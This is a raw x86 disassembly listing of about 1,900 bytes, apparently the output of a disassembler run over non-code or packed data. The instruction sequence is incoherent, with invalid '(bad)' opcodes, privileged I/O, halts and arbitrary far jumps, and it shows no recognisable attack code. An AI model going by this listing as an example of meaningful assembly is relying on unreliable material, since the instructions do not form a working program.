  422488:	dec    ebp
  422489:	pop    ss
  42248a:	cld    
  42248b:	xchg   edi,eax
  42248c:	test   al,0xb4
  42248e:	xor    DWORD PTR [esi-0x51],edi
  422491:	mov    dh,0x22
  422493:	push   ds
  422494:	ret    
  422495:	sar    DWORD PTR [eax-0x56],0x12
  422499:	pop    es
  42249a:	imul   ebx,DWORD PTR [ebx+ecx*2],0xcac8677f
  4224a1:	fistp  QWORD PTR [ebx+ecx*4]
  4224a4:	mov    edx,0xc5315bda
  4224a9:	out    dx,al
  4224aa:	mov    ebx,0xa63d2c3f
  4224af:	push   ss
  4224b0:	jp     0x42249a
  4224b2:	fadd   QWORD PTR [ebx+0x6f]
  4224b5:	(bad)  
  4224b6:	data16 sar BYTE PTR [edx],1
  4224b9:	sar    DWORD PTR [edx+0x69],1
  4224bc:	repnz pop es
  4224be:	sub    BYTE PTR [edx-0x80],0x72
  4224c2:	js     0x422491
  4224c4:	in     eax,0xa5
  4224c6:	jle    0x42246c
  4224c8:	cmp    al,0xbd
  4224ca:	loopne 0x4224a0
  4224cc:	aas    
  4224cd:	jecxz  0x4224b2
  4224cf:	push   0x24
  4224d1:	sub    ecx,ecx
  4224d3:	push   ebp
  4224d4:	xor    ebx,DWORD PTR [edx+0x6696eb68]
  4224da:	pop    edi
  4224db:	cmp    esi,DWORD PTR [ebx]
  4224dd:	xchg   esp,eax
  4224de:	dec    esp
  4224df:	adc    bh,BYTE PTR [ecx-0x17928f4a]
  4224e5:	imul   esp,DWORD PTR [ebx+edi*8],0x8b4e0e2e
  4224ec:	arpl   WORD PTR [edi+0x75],di
  4224ef:	cmp    al,0x14
  4224f1:	dec    esp
  4224f2:	and    eax,0xf2409d54
  4224f7:	mov    DWORD PTR [edx],esi
  4224f9:	clc    
  4224fa:	sub    esp,DWORD PTR [eax]
  4224fc:	push   cs
  4224fd:	sbb    al,0x7e
  4224ff:	mov    bh,0x3e
  422501:	add    ah,BYTE PTR [eax+eiz*2+0x5bb150ac]
  422508:	fimul  DWORD PTR [eax+0x66]
  42250b:	jns    0x422588
  42250d:	xchg   DWORD PTR [edx-0x5f],eax
  422510:	test   al,0x5
  422513:	and    DWORD PTR [ebp+0x325b16c2],edi
  422519:	add    edx,ebx
  42251b:	fld    DWORD PTR [esi+0x70]
  42251e:	xor    bh,BYTE PTR es:[ebp+0x5af82e88]
  422525:	ss jb  0x42256d
  422528:	pusha  
  422529:	fnstcw WORD PTR [edi-0x6b]
  42252c:	(bad)  ds:0xd74802e
  422532:	loopne 0x422532
  422534:	retf   
  422535:	mov    ch,0xe3
  422537:	sbb    al,0x20
  422539:	cli    
  42253a:	and    al,0xd9
  42253c:	and    DWORD PTR ds:0xf808863f,0x65
  422543:	data16 lods al,BYTE PTR ds:[esi]
  422545:	xlat   BYTE PTR ds:[ebx]
  422546:	jle    0x42250a
  422548:	fs xchg ebp,eax
  42254a:	mov    eax,0xa582e80d
  42254f:	fs hlt 
  422551:	js     0x42254b
  422553:	xchg   DWORD PTR [edi],ebx
  422555:	(bad)  
  422556:	mov    edx,0x4546c440
  42255b:	mov    eax,0xcc4c6906
  422560:	addr16 jnp 0x4225c1
  422563:	xor    esp,eax
  422565:	lods   eax,DWORD PTR ds:[esi]
  422566:	sub    eax,0x2f6db205
  42256b:	ret    0xf88e
  42256e:	aaa    
  42256f:	ins    BYTE PTR es:[edi],dx
  422570:	cmp    ebx,edi
  422572:	mov    ds,WORD PTR [ebx+0x10]
  422575:	std    
  422576:	lea    edx,[edi-0x5b]
  422579:	lock lds eax,FWORD PTR [ecx+ecx*1-0x4a]
  42257e:	add    DWORD PTR [edi+0x5affc28e],0xe48029ab
  422588:	out    0xaa,eax
  42258a:	xchg   ebp,eax
  42258b:	dec    edx
  42258c:	stos   BYTE PTR es:[edi],al
  42258d:	jecxz  0x4225c3
  42258f:	adc    DWORD PTR [esi+0x5c],esi
  422592:	jb     0x42260f
  422594:	(bad)  
  422596:	inc    esi
  422597:	adc    eax,0xda8286d9
  42259c:	push   eax
  42259d:	sbb    eax,0xd9ab83c1
  4225a2:	test   BYTE PTR [edx+0x0],0x11
  4225a6:	pop    ebx
  4225a7:	and    ebx,ecx
  4225a9:	xor    DWORD PTR [esi+0x3d2c91dd],esp
  4225af:	clc    
  4225b0:	jae    0x4225e2
  4225b2:	sbb    al,0xdd
  4225b4:	rcl    BYTE PTR [esi+0x27],cl
  4225b7:	adc    DWORD PTR [eax+0x4b],ecx
  4225ba:	mov    ch,0x59
  4225bc:	imul   edi,esi,0x17
  4225bf:	cld    
  4225c0:	int    0x7d
  4225c2:	test   eax,0x73e7276f
  4225c7:	(bad)  
  4225c8:	push   ebp
  4225c9:	and    DWORD PTR [edx+0x3b],edx
  4225cc:	and    BYTE PTR [edx+0x218fa55a],0x21
  4225d3:	or     ebx,0xbe9e4499
  4225d9:	in     al,dx
  4225da:	push   ss
  4225db:	jge    0x42259c
  4225dd:	add    BYTE PTR [eiz*4+0x7413d9b5],0x96
  4225e5:	popf   
  4225e6:	add    ebx,DWORD PTR [ebx-0x3]
  4225e9:	and    ebp,DWORD PTR [edx-0x43]
  4225ec:	xchg   esp,eax
  4225ed:	jmp    0x1f28:0x8bf95614
  4225f4:	jo     0x422667
  4225f6:	jmp    0x5134008a
  4225fb:	inc    ecx
  4225fc:	and    BYTE PTR [ebx+ebx*8+0x10],dl
  422600:	mov    al,ds:0x66015438
  422605:	outs   dx,DWORD PTR ds:[esi]
  422606:	cld    
  422607:	dec    esi
  422608:	add    DWORD PTR [ecx+0x2fea5a9e],esp
  42260e:	xlat   BYTE PTR ds:[ebx]
  42260f:	into   
  422610:	stos   DWORD PTR es:[edi],eax
  422611:	lods   eax,DWORD PTR ds:[esi]
  422612:	add    al,0x39
  422614:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  422616:	pop    ss
  422617:	nop
  422618:	sub    DWORD PTR [edx+0x3f9e347e],eax
  42261e:	outs   dx,DWORD PTR ds:[esi]
  42261f:	fwait
  422620:	xor    ebp,esp
  422622:	out    dx,eax
  422623:	adc    ebp,edi
  422625:	cmp    ebx,DWORD PTR [edi+0x4d]
  422628:	repz call 0x43602bbb
  42262e:	sub    dl,BYTE PTR [esi-0x5c27db71]
  422634:	mov    ebx,0xa71fda05
  422639:	mov    bh,0x5c
  42263b:	or     eax,0x60c96ef5
  422640:	push   0x9666d5fe
  422645:	(bad)  
  422646:	xor    dh,0xae
  422649:	call   FWORD PTR [edi+edx*2]
  42264c:	mov    dl,0x81
  42264e:	ins    BYTE PTR es:[edi],dx
  42264f:	mov    ss,WORD PTR [ebp+0x7fe574f4]
  422655:	scas   al,BYTE PTR es:[edi]
  422656:	es xchg ecx,eax
  422658:	and    DWORD PTR [ecx-0x1c],edx
  42265b:	retf   
  42265c:	in     eax,dx
  42265d:	jle    0x422655
  42265f:	pop    es
  422660:	inc    edi
  422661:	pop    esi
  422662:	scas   al,BYTE PTR es:[edi]
  422663:	jle    0x422668
  422665:	scas   al,BYTE PTR es:[edi]
  422666:	(bad)  
  422668:	pushf  
  422669:	fwait
  42266a:	imul   edx,DWORD PTR [esi],0xc8d043b0
  422670:	es mov ch,0x8e
  422673:	push   0xffffff89
  422675:	add    al,0x26
  422677:	sub    al,0x42
  422679:	call   0x9ccc7322
  42267e:	sub    BYTE PTR [esi-0x12],dl
  422681:	loope  0x422652
  422683:	mov    dh,0xcc
  422685:	dec    edi
  422686:	pop    edx
  422687:	popa   
  422688:	add    al,ah
  42268a:	sub    cl,ah
  42268c:	pop    edx
  42268d:	ror    esi,1
  42268f:	loopne 0x422611
  422691:	pushf  
  422692:	xor    al,BYTE PTR [ebx+eiz*2-0xb]
  422696:	cdq    
  422697:	aas    
  422698:	jg     0x42266d
  42269a:	xor    al,dl
  42269c:	adc    bl,dh
  42269e:	add    eax,0x3942f80a
  4226a3:	popa   
  4226a4:	mul    esi
  4226a6:	je     0x42269c
  4226a8:	stc    
  4226a9:	or     eax,0xdff69533
  4226ae:	pop    es
  4226af:	jo     0x42264c
  4226b1:	or     DWORD PTR [eax-0x645b6ce7],esp
  4226b7:	loop   0x4226d0
  4226b9:	shl    bh,1
  4226bb:	or     esp,esp
  4226bd:	mul    BYTE PTR [ecx+0x55]
  4226c0:	sbb    eax,DWORD PTR [edi]
  4226c2:	stc    
  4226c3:	dec    eax
  4226c4:	mov    dh,0xb3
  4226c6:	icebp  
  4226c7:	push   edi
  4226c8:	pop    edx
  4226c9:	jo     0x4226c7
  4226cb:	push   ebp
  4226cc:	mov    ds:0xb9c85992,al
  4226d1:	je     0x4226b1
  4226d3:	jl     0x422740
  4226d5:	iret   
  4226d6:	inc    esi
  4226d7:	cld    
  4226d8:	push   eax
  4226d9:	xchg   ebx,eax
  4226da:	push   0x44dc95f2
  4226df:	lock je 0x422703
  4226e2:	mov    ebp,0x72be41d3
  4226e7:	push   0x2c8251c7
  4226ec:	add    bh,BYTE PTR [ecx+ebp*1]
  4226ef:	pop    edi
  4226f0:	rcl    BYTE PTR [edi],cl
  4226f2:	and    cl,BYTE PTR [edi-0x12]
  4226f5:	(bad)  
  4226f6:	mov    DWORD PTR [ecx],eax
  4226f8:	gs or  eax,0x45033ae9
  4226fe:	jmp    0xb616:0xc7e86265
  422705:	ss clc 
  422707:	addr16 cmp eax,ebx
  42270a:	push   ebp
  42270b:	mov    ah,0x53
  42270d:	adc    al,0xfd
  42270f:	inc    eax
  422710:	imul   BYTE PTR [esi+0x39]
  422713:	inc    esi
  422714:	hlt    
  422715:	jge    0x42271d
  422717:	push   esi
  422718:	pop    edi
  422719:	add    al,0xe0
  42271b:	inc    edi
  42271c:	sub    al,dl
  42271e:	aaa    
  42271f:	outs   dx,BYTE PTR ds:[esi]
  422720:	push   0x7a
  422722:	push   edi
  422723:	xor    bh,BYTE PTR [ebp+0x4b]
  422726:	(bad)  
  422727:	bound  esi,QWORD PTR ds:0x30c87ed0
  42272d:	ja     0x4226e2
  42272f:	pop    es
  422730:	pop    ebx
  422731:	inc    ecx
  422732:	in     eax,0x3e
  422734:	into   
  422735:	ss mov edi,0x745fc7bf
  42273b:	add    ah,dl
  42273d:	jp     0x42277a
  42273f:	shl    DWORD PTR [esi+ebx*8+0x34],0x3b
  422744:	xor    eax,0x83538634
  422749:	aam    0x24
  42274b:	mov    esp,0xbad6b852
  422750:	pop    esp
  422751:	or     edx,DWORD PTR [ebx]
  422753:	adc    BYTE PTR [edi-0x24],0x3d
  422757:	lock test al,0x54
  42275a:	or     eax,0x88808b3f
  42275f:	mov    bl,BYTE PTR [edi-0x3e]
  422762:	clc    
  422763:	lods   al,BYTE PTR ds:[esi]
  422764:	sar    BYTE PTR [esi+ebx*8],0xbd
  422768:	cmp    al,0xb3
  42276a:	pop    ebp
  42276b:	adc    DWORD PTR [eax+0x1c],ebx
  42276e:	(bad)  
  42276f:	or     BYTE PTR [edx+0x5d],al
  422772:	les    eax,FWORD PTR [esi-0x7702e79c]
  422778:	aad    0xe9
  42277a:	dec    ebx
  42277b:	mov    esi,0xc0e846d7
  422780:	cli    
  422781:	pop    ecx
  422782:	mov    bl,0x31
  422784:	pusha  
  422785:	cmp    ah,BYTE PTR [eax]
  422787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422788:	fiadd  WORD PTR [ebp-0x72]
  42278b:	iret   
  42278c:	stos   BYTE PTR es:[edi],al
  42278d:	lea    eax,[ecx+0x3671d9ca]
  422793:	repz fs sbb eax,0x491d670e
  42279a:	lods   al,BYTE PTR ds:[esi]
  42279b:	fld    TBYTE PTR [esi-0x349b8efc]
  4227a1:	(bad)  
  4227a2:	push   ebp
  4227a3:	repz or BYTE PTR [edx],al
  4227a6:	test   DWORD PTR [ecx-0x5be119ab],0xfe59e8dd
  4227b0:	inc    eax
  4227b1:	call   0x1902:0x82c2d0aa
  4227b8:	outs   dx,DWORD PTR ds:[esi]
  4227b9:	rcl    BYTE PTR [edx-0x3f123cd9],cl
  4227bf:	mov    BYTE PTR [edx-0x2c869580],bh
  4227c5:	add    DWORD PTR [eax+0x47],edx
  4227c8:	xchg   BYTE PTR [ebx+0x7a],cl
  4227cb:	jb     0x4227c0
  4227cd:	fsub   QWORD PTR [eax]
  4227cf:	mov    al,0x8d
  4227d1:	dec    ecx
  4227d2:	push   DWORD PTR [edx+0x74]
  4227d5:	mov    ch,0x76
  4227d7:	xchg   ebx,eax
  4227d8:	inc    eax
  4227d9:	inc    DWORD PTR [ebx+0x36]
  4227dc:	enter  0xd686,0x1a
  4227e0:	or     DWORD PTR [edx+0x6c04c25e],ebx
  4227e6:	sub    al,0x99
  4227e8:	push   edi
  4227e9:	pop    esp
  4227ea:	clc    
  4227eb:	sub    eax,0x2b7bd4cb
  4227f0:	and    eax,DWORD PTR [esi+0x6f]
  4227f3:	mov    esi,0x9d23fabe
  4227f8:	fisttp QWORD PTR [ebx-0x170738d0]
  4227fe:	stos   BYTE PTR es:[edi],al
  4227ff:	inc    esp
  422800:	and    BYTE PTR [edi-0x54],ah
  422803:	loope  0x4227e0
  422805:	out    dx,al
  422806:	ss popf 
  422808:	gs scas al,BYTE PTR es:[edi]
  42280a:	inc    ebx
  42280b:	jge    0x42279a
  42280d:	mov    al,ds:0x7ca596f5
  422812:	push   ebp
  422813:	call   0x8473:0x19221fcb
  42281a:	cs dec ebp
  42281c:	jb     0x46c8b008
  422822:	cmp    BYTE PTR [edx+esi*2+0x1d1896ed],dh
  422829:	adc    eax,0x80086346
  42282e:	sub    al,0x2d
  422830:	mov    edi,DWORD PTR [esi-0x1473b71f]
  422836:	push   ebp
  422837:	xor    cl,BYTE PTR [edi]
  422839:	loop   0x42288c
  42283b:	(bad)  
  42283c:	cld    
  42283d:	push   ebp
  42283e:	icebp  
  42283f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422840:	mov    bl,dl
  422842:	popa   
  422843:	pop    eax
  422844:	(bad)  
  422845:	loopne 0x4227df
  422847:	adc    BYTE PTR [esp+edi*2],ah
  42284a:	cmp    al,BYTE PTR [ebx-0x24]
  42284d:	mov    ebp,?
  42284f:	xchg   ebp,eax
  422850:	outs   dx,DWORD PTR ds:[esi]
  422851:	or     al,0x26
  422853:	shl    esi,0xb
  422856:	push   eax
  422857:	cli    
  422858:	ret    
  422859:	outs   dx,BYTE PTR ds:[esi]
  42285a:	loop   0x42287f
  42285c:	dec    esp
  42285d:	push   eax
  42285e:	fmul   DWORD PTR [edi-0x1574352]
  422864:	sub    eax,0xd033479b
  422869:	ins    BYTE PTR es:[edi],dx
  42286a:	xlat   BYTE PTR ds:[ebx]
  42286b:	scas   eax,DWORD PTR es:[edi]
  42286c:	mov    al,BYTE PTR [ecx+0x44]
  42286f:	push   esi
  422870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422871:	call   0x6dfa99fa
  422876:	xor    bl,bl
  422878:	mov    ebx,eax
  42287a:	rcr    BYTE PTR [ecx],cl
  42287c:	or     BYTE PTR [esi+ebp*4-0x5b886eff],ah
  422883:	test   BYTE PTR [ebx],0x83
  422886:	stos   DWORD PTR es:[edi],eax
  422887:	push   edx
  422888:	cwde   
  422889:	dec    ecx
  42288a:	ja     0x422890
  42288c:	rol    DWORD PTR [edx-0x14],1
  42288f:	jbe    0x422862
  422891:	jne    0x422823
  422893:	push   ebx
  422894:	push   eax
  422895:	ja     0x422874
  422897:	pushf  
  422898:	add    al,0xc5
  42289a:	mov    dl,cl
  42289c:	push   edi
  42289d:	add    bh,dl
  42289f:	sahf   
  4228a0:	cmp    BYTE PTR [edi+0x20],dl
  4228a3:	iret   
  4228a4:	(bad)  
  4228a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228a6:	aam    0x20
  4228a8:	push   esp
  4228a9:	int    0x71
  4228ab:	jae    0x4228a4
  4228ad:	cwde   
  4228ae:	mov    al,ds:0x558a4dfb
  4228b3:	add    DWORD PTR [ebp+0x897e887],eax
  4228b9:	pop    ebp
  4228ba:	je     0x42291b
  4228bc:	push   esi
  4228bd:	add    al,0x52
  4228bf:	mov    ?,WORD PTR [ebx+0x7f]
  4228c2:	jp     0x4228ab
  4228c4:	pop    es
  4228c5:	or     BYTE PTR [edi],bh
  4228c7:	repz or bl,BYTE PTR [ecx+0x39]
  4228cb:	ror    BYTE PTR [edx],0xa5
  4228ce:	stc    
  4228cf:	inc    ebp
  4228d0:	cdq    
  4228d1:	pop    ss
  4228d2:	add    al,0x57
  4228d4:	xor    eax,0x736cc715
  4228d9:	addr16 sti 
  4228db:	scas   al,BYTE PTR es:[edi]
  4228dc:	les    ebx,FWORD PTR [esi-0x5]
  4228df:	xor    BYTE PTR [edi-0x6d],bl
  4228e2:	sub    esp,DWORD PTR [edi+ebp*4+0x6]
  4228e6:	or     eax,0x40f42e8c
  4228eb:	imul   ebx,DWORD PTR [eax+0x83cce5],0xffffffb2
  4228f2:	or     eax,0x78181170
  4228f7:	pop    ecx
  4228f8:	add    eax,0x488d5897
  4228fd:	mov    ds:0x30e00e90,al
  422902:	xor    eax,0x83aca9a1
  422907:	out    0x4e,al
  422909:	xor    DWORD PTR [ecx-0x23571208],ecx
  42290f:	mov    ds:0xa2a45c50,eax
  422914:	repz mov ecx,0xccd0e1d2
  42291a:	ss push eax
  42291c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42291d:	inc    ebx
  42291e:	inc    ecx
  42291f:	jbe    0x42296a
  422921:	out    0x2f,eax
  422923:	mov    ebx,0x132b23a8
  422928:	leave  
  422929:	lea    esi,gs:[edi+0x6b4658ff]
  422930:	aam    0x74
  422932:	dec    esi
  422933:	add    BYTE PTR [edx-0x4d],dh
  422936:	fsubp  st(3),st
  422938:	mov    ds:0x48c684ee,eax
  42293d:	xor    al,0x95
  42293f:	add    al,0x41
  422941:	ret    0x83d2
  422944:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422945:	cmc    
  422946:	les    eax,FWORD PTR [ecx-0x19]
  422949:	xlat   BYTE PTR ds:[ebx]
  42294a:	jecxz  0x42299e
  42294c:	mov    bh,0x68
  42294e:	mov    edi,0xec2ddaf9
  422953:	cmp    BYTE PTR [esi+0x4d],dl
  422956:	out    0xa2,al
  422958:	xchg   edi,eax
  422959:	stc    
  42295a:	pop    ebp
  42295b:	fmul   DWORD PTR [ebx+0x34]
  42295e:	mov    ebp,0x2ce1ecf7
  422963:	xor    eax,0x528245af
  422968:	cmp    DWORD PTR [esi],esp
  42296a:	pop    ss
  42296b:	(bad)  
  42296d:	in     al,dx
  42296e:	jnp    0x42294f
  422970:	sbb    al,0xa2
  422972:	outs   dx,DWORD PTR ds:[esi]
  422973:	add    eax,0x7e9aecf
  422978:	arpl   si,si
  42297a:	inc    ebx
  42297b:	outs   dx,BYTE PTR ds:[esi]
  42297c:	scas   al,BYTE PTR es:[edi]
  42297d:	cmp    bh,BYTE PTR [edi-0x587e5908]
  422983:	int3   
  422984:	addr16 push edi
  422986:	cmp    BYTE PTR [eax+0x37],al
  422989:	int    0x67
  42298b:	xor    bl,al
  42298d:	(bad)  
  42298e:	(bad)  
  42298f:	in     eax,0x0
  422991:	mov    ah,BYTE PTR [eax+0x1e291659]
  422997:	jl     0x422920
  422999:	mov    ecx,DWORD PTR [ecx-0x5e60260c]
  42299f:	jp     0x4229a1
  4229a1:	cmp    ebx,DWORD PTR [ecx-0x25]
  4229a4:	pop    ebp
  4229a5:	or     al,0x5f
  4229a7:	jb     0x422934
  4229a9:	fs in  eax,0xa7
  4229ac:	int3   
  4229ad:	rcl    DWORD PTR [ebp-0x75],0x67
  4229b1:	jp     0x4229b1
  4229b3:	test   DWORD PTR [eax+0x47615d78],esi
  4229b9:	loope  0x4229c2
  4229bb:	adc    al,0xc3
  4229bd:	scas   al,BYTE PTR es:[edi]
  4229be:	pop    ebp
  4229bf:	(bad)  
  4229c0:	js     0x422a17
  4229c2:	mov    ch,0x3
  4229c4:	fsubp  st(2),st
  4229c6:	push   ecx
  4229c7:	push   es
  4229c8:	mov    edx,0x385d09ec
  4229cd:	ret    0x5d57
  4229d0:	in     eax,dx
  4229d1:	push   esp
  4229d2:	(bad)  
  4229d3:	out    dx,eax
  4229d4:	nop
  4229d5:	push   es
  4229d6:	mov    ah,0x70
  4229d8:	pop    es
  4229d9:	iret   
  4229da:	add    esi,esp
  4229dc:	(bad)  
  4229dd:	jmp    0x4229a9
  4229df:	mov    bl,0x13
  4229e1:	add    edi,DWORD PTR [ebx+0x2e9b177a]
  4229e7:	mov    esi,0x9db4e557
  4229ec:	pop    ds
  4229ed:	inc    edi
  4229ee:	inc    ecx
  4229ef:	fcom   QWORD PTR [ebp+ebx*4+0x7]
  4229f3:	and    eax,0xfcf98912
  4229f8:	and    bl,BYTE PTR ds:0x7ead3d93
  4229fe:	(bad)  
  422a01:	jmp    edi
  422a03:	adc    al,0x10
  422a05:	adc    al,0x10
  422a07:	nop
  422a08:	push   ss
  422a09:	(bad)  
  422a0a:	dec    edi
  422a0b:	sbb    eax,0x2489ac66
  422a10:	repnz inc esi
  422a12:	daa    
  422a13:	sub    cl,ah
  422a15:	and    DWORD PTR [ebp+0x25587c69],ebx
  422a1b:	outs   dx,DWORD PTR ds:[esi]
  422a1c:	ret    
  422a1d:	xchg   esp,eax
  422a1e:	jne    0x422a13
  422a20:	iret   
  422a21:	cmp    BYTE PTR [eax-0x4],ah
  422a24:	jmp    0x422a96
  422a26:	repnz add edx,DWORD PTR ds:[esi+0x18111d50]
  422a2e:	sbb    al,0x2
  422a30:	add    al,0x5b
  422a32:	jmp    0xe65064df
  422a37:	pop    ebx
  422a38:	jb     0x422a61
  422a3a:	(bad)
  422a3d:	jg     0x422a14
  422a3f:	and    DWORD PTR [esi],0x228f0c94
  422a45:	mov    ds:0x3349c986,al
  422a4a:	jmp    0x50ef0ae6
  422a4f:	or     eax,0x8b61a55e
  422a54:	sti    
  422a55:	in     eax,dx
  422a56:	adc    DWORD PTR [ebp+eiz*8-0x494f27df],0x25
  422a5e:	xor    DWORD PTR [esi],edi
  422a60:	outs   dx,DWORD PTR ds:[esi]
  422a61:	pop    edi
  422a62:	mov    esi,0x595d9ea6
  422a67:	sub    edx,DWORD PTR [edx-0x8735d6f]
  422a6d:	inc    ebp
  422a6e:	pop    esp
  422a6f:	jecxz  0x422ae3
  422a71:	add    DWORD PTR ds:0xcfcc0d2e,esp
  422a77:	outs   dx,DWORD PTR ds:[esi]
  422a78:	out    dx,eax
  422a79:	mov    bh,0xc4
  422a7b:	popa   
  422a7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a7d:	aaa    
  422a7e:	retf   0xc688
  422a81:	sbb    bh,dh
  422a83:	es add dl,dh
  422a86:	inc    esp
  422a87:	sbb    eax,DWORD PTR [esi+0x19]
  422a8a:	xchg   esp,eax
  422a8b:	rol    DWORD PTR [ebp+0x1787e424],0x10
  422a92:	fwait
  422a93:	jmp    0x82f94242
  422a98:	inc    DWORD PTR [ebx+0x49]
  422a9b:	push   cs
  422a9c:	inc    edi
  422a9d:	pusha  
  422a9e:	lods   eax,DWORD PTR ds:[esi]
  422a9f:	mov    ds:0x79171e36,al
  422aa4:	sub    BYTE PTR [ecx+0x17946195],dl
  422aaa:	ins    DWORD PTR es:[edi],dx
  422aab:	push   cs
  422aac:	xchg   edx,eax
  422aad:	cld    
  422aae:	mov    al,BYTE PTR [eax+edi*8]
  422ab1:	ds push ebx
  422ab3:	js     0x422abc
  422ab5:	jp     0x422aad
  422ab7:	lds    ecx,FWORD PTR [eax-0x3c]
  422aba:	(bad)  
  422abb:	loopne 0x422b32
  422abd:	pop    ss
  422abe:	aam    0x2a
  422ac0:	and    BYTE PTR [ecx],0x9b
  422ac3:	jl     0x422b1b
  422ac5:	add    DWORD PTR [edi],esi
  422ac7:	shr    BYTE PTR [esi],cl
  422ac9:	jns    0x422a76
  422acb:	push   esi
  422acc:	cmp    BYTE PTR [ebx-0x26a46aa3],0xd1
  422ad3:	jo     0x422a64
  422ad5:	popa   
  422ad6:	jge    0x422ab8
  422ad8:	lods   eax,DWORD PTR ds:[esi]
  422ad9:	dec    esp
  422ada:	jne    0x422a5f
  422adc:	and    cl,al
  422ade:	fmul   QWORD PTR [ebx+0x17]
  422ae1:	sub    DWORD PTR [ebx-0x348bc2e1],esp
  422ae7:	mov    esp,0x76608b6f
  422aec:	pop    ecx
  422aed:	(bad)  
  422aee:	xchg   ebx,eax
  422aef:	fimul  WORD PTR ss:[ebp+0x55]
  422af3:	sbb    ah,BYTE PTR [ebx-0x4c]
  422af6:	pop    ds
  422af7:	sbb    al,0x79
  422af9:	xchg   DWORD PTR [esi+0x3],ecx
  422afc:	(bad)  
  422afd:	shr    BYTE PTR [ecx],cl
  422aff:	adc    edx,DWORD PTR [ebp+0x1e606ded]
  422b05:	ror    edi,1
  422b07:	push   cs
  422b08:	ds in  eax,dx
  422b0a:	mov    dl,0x4a
  422b0c:	pop    ebx
  422b0d:	outs   dx,DWORD PTR ds:[esi]
  422b0e:	jmp    0xbadf68df
  422b13:	clc    
  422b14:	cmp    ebx,ecx
  422b16:	mov    dh,0xd1
  422b18:	enter  0xa22,0xa4
  422b1c:	inc    esp
  422b1d:	test   DWORD PTR [edx+0x2f1e71d4],esp
  422b23:	rcl    DWORD PTR [edi-0x47],0x58
  422b27:	sti    
  422b28:	xchg   esi,eax
  422b29:	mov    edi,0xd282f347
  422b2e:	pushf  
  422b2f:	lahf   
  422b30:	jnp    0x422b47
  422b32:	pop    ss
  422b33:	ss enter 0x9833,0xd8
  422b38:	shl    eax,1
  422b3a:	xchg   ebx,eax
  422b3b:	sbb    esi,DWORD PTR [edi]
  422b3d:	fs xchg ecx,eax
  422b3f:	and    ebx,DWORD PTR [esi+0x3dfc5f9e]
  422b45:	jbe    0x422b66
  422b47:	and    DWORD PTR [edi+ebp*1-0xbcba1af],ebp
  422b4e:	pop    ds
  422b4f:	push   eax
  422b50:	fld    DWORD PTR [edi]
  422b52:	and    al,0xb6
  422b54:	mov    edi,0x25c2df06
  422b59:	pop    edx
  422b5a:	hlt    
  422b5b:	xchg   ecx,eax
  422b5c:	push   edx
  422b5d:	loopne 0x422b52
  422b5f:	push   ebp
  422b60:	sub    eax,0xcad9a8db
  422b65:	or     eax,0xc1f0c920
  422b6a:	ja     0x422b54
  422b6c:	stos   BYTE PTR es:[edi],al
  422b6d:	and    BYTE PTR [edi+0x58],cl
  422b70:	adc    al,0xa4
  422b72:	test   BYTE PTR [ecx],ah
  422b74:	cmp    al,0x28
  422b76:	sbb    BYTE PTR [ebp+0x79],dl
  422b79:	jbe    0x422bbe
  422b7b:	fdivr  DWORD PTR ds:0x60286c52
  422b81:	retf   
  422b82:	and    eax,0xdc0583f1
  422b87:	mov    edx,0xaac8e47f
  422b8c:	out    0x53,eax
  422b8e:	ins    DWORD PTR es:[edi],dx
  422b8f:	pop    esp
  422b90:	and    ebp,DWORD PTR [ebx+ebp*4+0x1a]
  422b94:	xor    eax,0xdd61d732
  422b99:	sbb    eax,0xccc19e8c
  422b9e:	sbb    ch,BYTE PTR [edx]
  422ba0:	mov    edx,0x9e2fee99
  422ba5:	dec    esp
  422ba6:	sub    esi,DWORD PTR [ebp+0x7ff1dd94]
  422bac:	(bad)  
  422bae:	sub    eax,ecx
  422bb0:	jo     0x422b4b
  422bb2:	or     bh,BYTE PTR [edi+0x6c5e1efb]
  422bb8:	enter  0xb192,0x31
  422bbc:	fstp   DWORD PTR [ebx+edx*8+0x4dfeaab7]
  422bc3:	aad    0x1c
  422bc5:	stos   BYTE PTR es:[edi],al
  422bc6:	out    0xe4,eax
  422bc8:	mov    cl,0x2
  422bca:	jg     0x422bcd
  422bcc:	in     al,dx
  422bcd:	add    esi,DWORD PTR [ebx]
  422bcf:	mov    edi,0x18846157
  422bd4:	in     al,dx
  422bd5:	jnp    0x422c3d
  422bd7:	sub    BYTE PTR [edi+0x2631b300],dh
  422bdd:	dec    eax
  422bde:	mov    ebp,0x66f4fd3a
  422be3:	dec    eax
  422be4:	pop    ds
  422be5:	dec    ecx
  422be6:	cmp    eax,eax
  422be8:	dec    esi
  422be9:	mov    DWORD PTR [ebp+0x5d],ecx
  422bec:	test   BYTE PTR [eax-0x78c7eef1],dh
  422bf2:	inc    ebx
  422bf3:	test   BYTE PTR [edi-0x4b],ch
  422bf6:	es xchg esp,eax
  422bf8:	test   BYTE PTR [eax],cl
  422bfa:	mov    dh,0x30
  422bfc:	cli    
  422bfd:	outs   dx,BYTE PTR ds:[esi]
  422bfe:	and    eax,0x4f37f796
  422c03:	retf   
  422c04:	mov    dl,0x8b
  422c06:	add    eax,0x90d0b56f
  422c0b:	mov    dl,0x14
  422c0d:	jle    0x422bfc
  422c0f:	dec    ecx
  422c10:	lahf   
  422c11:	out    dx,eax
  422c12:	xchg   BYTE PTR [eax+0x68ff97c],ch
  422c18:	mov    bh,0xed
  422c1a:	retf   0x8663
  422c1d:	sub    BYTE PTR [edx],dh
  422c1f:	rcr    BYTE PTR [esi],1
  422c21:	fsubr  QWORD PTR [esi+eax*8+0x33]
  422c25:	jae    0x422bfe
  422c27:	jge    0x422c16
  422c29:	in     eax,dx
  422c2a:	or     esp,esi
  422c2c:	scas   eax,DWORD PTR es:[edi]
  422c2d:	and    BYTE PTR [ebx+eiz*8-0x63],0xcc
  422c32:	adc    eax,0xa9490e21
  422c37:	jl     0x422c5e
  422c39:	jnp    0x422bcf
  422c3b:	add    eax,ecx
  422c3d:	or     eax,0xae657402
  422c42:	cmc    
  422c43:	push   ebx
  422c44:	ds std 
  422c46:	mov    edx,0x59195dd7
  422c4c:	enter  0xac30,0xca
  422c50:	daa    
  422c51:	mov    esp,ebp
  422c53:	lock mov dh,0xd8
